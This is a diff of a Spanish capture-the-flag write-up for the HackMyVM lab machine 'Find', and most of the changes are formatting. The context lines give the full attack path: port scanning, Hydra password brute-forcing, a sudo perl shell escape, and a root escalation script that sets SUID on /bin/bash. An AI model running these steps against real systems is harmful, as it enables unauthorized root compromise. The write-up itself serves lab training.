@@ -1,12 +1,14 @@
-# Maquina find Hackmyvm
+# Maquina Find Hackmyvm
+
 ```
+Nivel =  facil
 ip: 10.10.10.93
 ports : 22 80
 ```
 ## Enumeracion de puertos y Servicios
 
 ~~~
-# Nmap 7.92SVN scan initiated Wed Jun 15 16:02:59 2022 as: nmap -p- -sCV -T4 -v -n -oN targeted -oX taargetedXML 10.10.10.93
+# Nmap 7.92SVN scan initiated Wed Jun 15 16:02:59 2022 as: nmap -p- -sCV -T4 -v -n -oN targeted -oX targetedXML 10.10.10.93
 Nmap scan report for 10.10.10.93
 Host is up (0.0013s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -29,7 +31,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Jun 15 16:03:19 2022 -- 1 IP address (1 host up) scanned in 20.00 secon
 ~~~
 
-# Enumeracion de archivos y carpetas
+## Enumeracion de archivos y carpetas
 
 ~~~
 [16:24:44] 200 -   10KB - /index.html
@@ -50,7 +52,7 @@ VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
 KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
 ```
 
-Se puede compilar en esta pagina , para dar con ella tela
+Se puede compilar en esta pagina , para dar con ella tela.
 ~~~
 http://www.malbolge.doleczek.pl/
 ~~~
@@ -69,9 +71,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 16:22:
 1 of 1 target successfully completed, 1 valid password found
 
 
-## User Pivoting
+### User Pivoting
 
-Del usuario xxxxxxx --> kings
+Del usuario xxxxxxx --> kings.
 
 Con sudo -l podemos ejecutar perl en gtfobins encontramos la manera de ejecutar una bash.
 
@@ -100,7 +102,9 @@ User kings may run the following commands on find:
     (ALL) NOPASSWD: /opt/boom/boom.sh
 
 
-Nos vamos a la carpeta opt y veremos que tenemos permisos de escritura creamos la carpeta boom y el archivo boom.sh
+Nos vamos a la carpeta opt y veremos que tenemos permisos de escritura creamos la carpeta boom y el archivo boom.sh.
+
+
 
 ```bash
 #!/bin/bash
@@ -108,7 +112,9 @@ Nos vamos a la carpeta opt y veremos que tenemos permisos de escritura creamos l
 chmod u+s /bin/bash
 ```
 
-Le damos permisos chmod +x boom.sh y lo ejecutamos --> sudo -u root /opt/boom/boom.sh
+Le damos permisos chmod +x boom.sh y lo ejecutamos --> sudo -u root /opt/boom/boom.sh.
+
+Aqui al ejecutarlo lo que haremos es darle permisos SUID al binario /bin/bash.
 
 Con bash -p accedemos como root.
 ~~~
